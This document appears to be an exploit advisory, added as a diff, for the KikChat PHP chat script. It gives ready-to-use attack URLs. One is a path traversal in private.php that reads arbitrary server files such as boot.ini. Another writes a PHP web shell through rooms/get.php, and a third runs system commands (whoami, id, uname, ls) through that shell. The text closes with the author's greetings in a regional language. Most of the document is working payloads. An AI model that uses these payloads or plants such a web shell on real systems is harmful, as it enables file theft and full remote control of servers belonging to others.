@@ -1,0 +1,31 @@
+# KikChat <= (LFI/RCE) Multiple Vulnerability
+# By cr4wl3r http://bastardlabs.info
+# Script : http://petitvincent.perso.free.fr/Webmastering/Script%20PHP%20HTML%20JAVASCRIPT/php%20scripts/kikchat.zip
+# Tested : Windows / Linux
+# Dork   : download script
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Vulnable LFI [ private.php ]
+
+http://127.0.0.1/KikChat/private.php?name=../../../../../../../../../../[file]
+http://127.0.0.1/KikChat/private.php?name=../../../../../../../../../../boot.ini
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Vulnable RCE [ /rooms/get.php ]:
+
+http://127.0.0.1/KikChat/rooms/get.php?name=shell.php&ROOM=<?php system($cmd); ?>
+http://127.0.0.1/KikChat/myroom/shell.php?cmd=whoami;id;uname -a;pwd;ls -al
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+makase banyak :
+
+tau lo bentor to hulandalo
+tamongodula'a wau tamohutata, dulo ito momongulipu
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+p.s 
+malandingalo wa'u sebenarnya mohutu sploitz
+bo sekedar koleksi saja :D
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+// gorontalo 2013
